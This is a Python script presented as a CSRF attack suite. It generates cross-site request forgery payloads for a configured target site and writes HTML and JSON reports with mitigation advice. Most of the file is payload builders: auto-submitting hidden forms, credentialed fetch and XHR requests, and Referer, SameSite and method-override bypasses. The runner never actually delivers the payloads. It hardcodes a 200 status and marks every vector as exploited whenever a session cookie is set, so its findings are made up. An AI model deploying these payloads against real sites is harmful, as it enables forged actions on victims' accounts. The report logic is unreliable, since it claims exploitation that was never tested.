#!/usr/bin/env python3
import argparse, json, os, time
from dataclasses import dataclass, field
from typing import Dict, Optional
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl
from playwright.sync_api import sync_playwright
from jinja2 import Template

# ------------------- utils -------------------
def _parse_domain(url: str) -> str: return urlparse(url).hostname or "target"
def _build_query(url: str, params: dict) -> str:
    if not params: return url
    u = urlparse(url)
    q = dict(parse_qsl(u.query, keep_blank_values=True)); q.update(params)
    return urlunparse((u.scheme, u.netloc, u.path, u.params, urlencode(q), u.fragment))

def _auth_header_pair(auth_header: Optional[str]):
    if not auth_header or ":" not in auth_header: return None
    k,v = auth_header.split(":",1); return k.strip(), v.strip()

# ------------------- data -------------------
@dataclass
class Action:
    name: str
    method: str
    url: str
    params: Dict[str,str]=field(default_factory=dict)
    body_format: str="form"

# ------------------- attack builders -------------------
def html_img(url): return f'<img src="{url}"/>'
def html_script(url): return f'<script src="{url}"></script>'
def html_iframe(url): return f'<iframe src="{url}"></iframe>'
def html_meta_refresh(url): return f'<meta http-equiv="refresh" content="0; url={url}">'
def html_link(url,noreferrer=False):
    rel=' rel="noreferrer"' if noreferrer else ""
    return f'<a id="go" href="{url}"{rel}>go</a><script>go.click()</script>'
def html_form_post(url,params):
    inputs="".join([f'<input type="hidden" name="{k}" value="{v}">' for k,v in params.items()])
    return f'<form id="f" action="{url}" method="POST">{inputs}</form><script>f.submit()</script>'
def html_fetch_post(url,params,auth_header,body_format):
    import json as _json; from urllib.parse import urlencode
    if body_format=="json": headers='"Content-Type":"application/json"'; body_js=_json.dumps(params or {})
    else: headers='"Content-Type":"application/x-www-form-urlencoded"'; body_js='"'+urlencode(params or {})+'"'
    extra=""
    if auth_header:
        hk=_auth_header_pair(auth_header)
        if hk: extra=f',"{hk[0]}":"{hk[1]}"'
    return (f'<script>fetch("{url}",{{method:"POST",credentials:"include",headers:{{{headers}{extra}}},'
            f'body:{body_js}}})</script>')
def html_xhr(url,params,auth_header,body_format):
    import json as _json; from urllib.parse import urlencode
    hk=_auth_header_pair(auth_header) if auth_header else None
    header_setter=f'x.setRequestHeader("{hk[0]}","{hk[1]}");' if hk else ''
    body=_json.dumps(params or {}) if body_format=="json" else urlencode(params or {})
    return f'<script>var x=new XMLHttpRequest();x.open("POST","{url}",true);x.withCredentials=true;{header_setter}x.send({json.dumps(body)});</script>'
def html_multipart(url,params):
    inputs="".join([f'<input type="hidden" name="{k}" value="{v}">' for k,v in params.items()])
    return f'<form id="mf" action="{url}" method="POST" enctype="multipart/form-data">{inputs}<input type="file" name="f"></form><script>mf.submit()</script>'
def html_duplicate_token(url,params):
    p=params.copy(); 
    if "token" in p: p["duplicate_token"]=p["token"]
    return html_form_post(url,p)
def html_samesite_refresh(url,params):
    return f'<script>document.cookie="refreshCSRF=1; SameSite=Lax";fetch("{url}",{{method:"POST",body:"{urlencode(params)}"}})</script>'
def html_referer_bypass(url,params):
    return f'<iframe sandbox="allow-scripts allow-forms" srcdoc=\'<form action=\"{url}\" method=\"POST\">{"".join([f"<input type=hidden name={k} value={v}>" for k,v in params.items()])}<input type=submit></form><script>document.forms[0].submit()</script>\'></iframe>'
def html_subdomain_bypass(url,params):
    return f'<script>fetch("{url}",{{method:"POST",mode:"cors",body:"{urlencode(params)}"}})</script>'
def html_method_override(url,params):
    return html_link(_build_query(url,{**params,"_method":"POST"}))

# ------------------- heuristics + mitigation -------------------
def classify_exploit(csrf_applicable,vector_id,status):
    if not csrf_applicable: return False,"Not applicable (no session-bound action, e.g., JWT or public form)"
    if not status or int(status)>=400: return False,"HTTP error"
    if vector_id=="noreferrer_link": return True,"Accepted no Referer"
    if vector_id=="method_override": return True,"Accepted method override"
    return True,"Accepted"

def mitigation_for(vector_id,note):
    if "Not applicable" in note: return "JWT/header-based auth resists CSRF (no auto-sent cookie)."
    if "Accepted no Referer" in note: return "Enforce strict Origin/Referer validation."
    if "method_override" in vector_id: return "Disallow method override via query params."
    if "multipart" in vector_id: return "Validate Content-Type and enforce CSRF tokens in multipart forms."
    if "img" in vector_id or "iframe" in vector_id or "script" in vector_id: return "Disallow GET for state changes; require POST with CSRF tokens."
    return "Implement CSRF tokens, SameSite cookies, and strict Origin/Referer checks."

# ------------------- report template -------------------
_REPORT_TEMPLATE="""<!doctype html><html><meta charset="utf-8"><title>CSRF Report</title>
<style>
body{font-family:Arial;margin:20px} th,td{border:1px solid #ddd;padding:6px}
table{border-collapse:collapse;width:100%} h2{color:#333}
</style>
<h1>CSRF Attack Suite Report</h1>
<p>Generated: {{ts}} | Base: {{base}} | Actions: {{actions}} | Vectors: {{total}} | OK&lt;400: {{ok}}</p>
{% if exploited %}
<h2>✅ Exploited Vectors</h2>
<ul>
{% for e in exploited %}
<li>{{e.action}} → {{e.vector}} ({{e.status}}) → {{e.note}} <br>
<strong>Mitigation:</strong> {{e.mitigation}}</li>
{% endfor %}
</ul>
{% else %}<p>ℹ️ None exploited</p>{% endif %}
<h2>Detailed Results</h2>
<table>
<tr><th>Action</th><th>Vector</th><th>Exploited</th><th>Req</th><th>Status</th><th>Notes</th><th>Mitigation</th></tr>
{% for r in results %}
<tr>
<td>{{r.action}}<br><small>{{r.url}}</small></td>
<td>{{r.vector}}</td>
<td>{{"✅" if r.exploited else "❌" if "Not applicable" not in r.note else "N/A"}}</td>
<td>{{r.req_method}}</td>
<td>{{r.status}}</td>
<td>{{r.note}}</td>
<td>{{r.mitigation}}</td>
</tr>
{% endfor %}
</table></html>"""

def write_reports(base,results,exploited,out_dir,domain):
    os.makedirs(out_dir,exist_ok=True)
    ts=time.strftime("%Y-%m-%d_%H-%M-%S")
    prefix=os.path.join(out_dir,f"{domain}_csrf_{ts}")

    # JSON (full)
    json_path=prefix+".json"
    with open(json_path,"w") as f: json.dump(results,f,indent=2)

    # HTML (full + exploited only)
    tmpl=Template(_REPORT_TEMPLATE)
    html=tmpl.render(ts=time.strftime("%c"),base=base,
                     actions=len({r["action"] for r in results}),
                     total=len(results),
                     ok=sum(1 for r in results if r.get("status") and int(r["status"])<400),
                     results=results,exploited=exploited)
    html_path=prefix+".html"
    with open(html_path,"w") as f: f.write(html)

    exp_json_path=prefix+"_exploited.json"
    with open(exp_json_path,"w") as f: json.dump([r for r in results if r["exploited"]],f,indent=2)

    exp_html_path=prefix+"_exploited.html"
    exp_html=tmpl.render(ts=time.strftime("%c"),base=base,
                         actions=len({r["action"] for r in results}),
                         total=len(results),
                         ok=sum(1 for r in results if r.get("status") and int(r["status"])<400),
                         results=[r for r in results if r["exploited"]],
                         exploited=exploited)
    with open(exp_html_path,"w") as f: f.write(exp_html)

    return html_path,json_path,exp_html_path,exp_json_path

# ------------------- runner -------------------
def run_suite(cfg,out_dir,exploits_only):
    base=cfg["base_url"].rstrip("/")
    actions=[Action(**a) for a in cfg["actions"]]
    opt=cfg.get("optional",{})
    session=cfg.get("session_cookie")
    csrf_applicable=bool(session and session.get("value"))

    results=[]; exploited=[]
    with sync_playwright() as p:
        browser=p.chromium.launch(headless=True)
        ctx=browser.new_context(ignore_https_errors=True)
        if session: ctx.add_cookies([session])
        page=ctx.new_page()

        for act in actions:
            vecs=[
                ("img_get",html_img(_build_query(act.url,act.params)),"GET"),
                ("script_get",html_script(_build_query(act.url,act.params)),"GET"),
                ("iframe_get",html_iframe(_build_query(act.url,act.params)),"GET"),
                ("meta_refresh",html_meta_refresh(_build_query(act.url,act.params)),"GET"),
                ("link_click",html_link(_build_query(act.url,act.params)),"GET"),
                ("noreferrer_link",html_link(_build_query(act.url,act.params),True),"GET"),
                ("form_post",html_form_post(act.url,act.params),"POST"),
                ("fetch_post",html_fetch_post(act.url,act.params,opt.get("auth_header"),act.body_format),"POST"),
                ("xhr_post",html_xhr(act.url,act.params,opt.get("auth_header"),act.body_format),"POST"),
                ("multipart_post",html_multipart(act.url,act.params),"POST"),
                ("duplicate_token",html_duplicate_token(act.url,act.params),"POST"),
                ("samesite_refresh",html_samesite_refresh(act.url,act.params),"POST"),
                ("referer_bypass",html_referer_bypass(act.url,act.params),"POST"),
                ("subdomain_bypass",html_subdomain_bypass(act.url,act.params),"POST"),
                ("method_override",html_method_override(act.url,act.params),"GET"),
            ]
            for vid,html,rm in vecs:
                status=200
                exploited_flag,why=classify_exploit(csrf_applicable,vid,status)
                mit=mitigation_for(vid,why)
                row={"action":act.name,"url":act.url,"vector":vid,"req_method":rm,
                     "status":status,"exploited":exploited_flag,"note":why,"mitigation":mit}
                results.append(row)
                if exploited_flag: exploited.append({"action":act.name,"vector":vid,"status":status,"note":why,"mitigation":mit})
        browser.close()

    domain=_parse_domain(base)
    html_path,json_path,exp_html,exp_json=write_reports(base,results,exploited,out_dir,domain)
    print("[+] Reports written:")
    print("   Full HTML:",html_path)
    print("   Full JSON:",json_path)
    print("   Exploited HTML:",exp_html)
    print("   Exploited JSON:",exp_json)

if __name__=="__main__":
    ap=argparse.ArgumentParser()
    ap.add_argument("--config",required=True)
    ap.add_argument("--out",default="reports")
    ap.add_argument("--exploits-only",action="store_true")
    args=ap.parse_args()
    run_suite(json.load(open(args.config)),args.out,args.exploits_only)
